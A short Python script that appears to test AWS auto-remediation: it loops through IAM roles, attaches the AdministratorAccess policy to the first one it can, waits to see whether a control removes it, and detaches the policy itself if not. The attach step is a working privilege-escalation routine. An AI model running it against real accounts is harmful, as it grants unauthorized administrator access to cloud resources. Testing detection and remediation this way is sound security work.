import boto3,time

DEBUG=0

def check_for_admin_policy(attached_policies):
  admin_pol_found=0

  for policy in attached_policies:
    if policy['PolicyArn'] == admin_policy_arn and not admin_pol_found:
      admin_pol_found=1
      print("Admin policy found")

  return admin_pol_found

iam_client = boto3.client('iam')

print("Running Attack:")
print("Attach Admin Policy to Role...")

attack_successful=0

admin_policy_arn='arn:aws:iam::aws:policy/AdministratorAccess'

roles = iam_client.list_roles()['Roles']
for role in roles:
  if DEBUG:
    print(role)

  if not attack_successful:

    role_name=role['RoleName']
    print(role_name)

    # check if admin policy already attached
    attached_policies = iam_client.list_attached_role_policies(RoleName=role_name)['AttachedPolicies']

    admin_pol_found=check_for_admin_policy(attached_policies)
      
    if not admin_pol_found:
      try:
        print("Attempting to attach admin policy to role...")
        response = iam_client.attach_role_policy(
          RoleName=role_name,
          PolicyArn=admin_policy_arn
        )
 
        if DEBUG:
          print(response)

        # check if policy was attached:
        print("Checking if attack was successful...")
        attached_policies = iam_client.list_attached_role_policies(RoleName=role_name)['AttachedPolicies']
        if check_for_admin_policy(attached_policies):
          print("Policy successfully attached")
          print("Attack successful\n")
          attack_successful=1
          break;
        else:
          print("Attack failed, attempting with next role\n")

      except:
        print("Unable to attach policy to: ", role_name, "attempting with next role\n")
  
    else:
      print("Admin policy already attached to role, attempting with next role\n")

    time.sleep(1)

if attack_successful:
  print("Waiting 60 seconds to see if attack was auto-remediated for role", role_name)
  time.sleep(60) 

  # check if attack was auto remediated
  print("Checking if attack was auto-remediated...")
  attached_policies = iam_client.list_attached_role_policies(RoleName=role_name)['AttachedPolicies']
  if not check_for_admin_policy(attached_policies):
    print("Admin policy no longer found.")
    print("Attack WAS auto-remidiated")
  else:
    print("Admin policy found.")
    print("Attack was NOT auto-remidiated")
    print("Attempting to remidiate now...")
    response = iam_client.detach_role_policy(
      RoleName = role_name,
      PolicyArn = admin_policy_arn
    )
    time.sleep(5)
    attached_policies = iam_client.list_attached_role_policies(RoleName=role_name)['AttachedPolicies']
    if not check_for_admin_policy(attached_policies):
      print("Attack was remidated by this script")
    else:
      print("Could not remediate...")
      print("Remove the admin policy manually ASAP!!!")

else:
  print("Attack failed, could not attach admin policy to any roles")
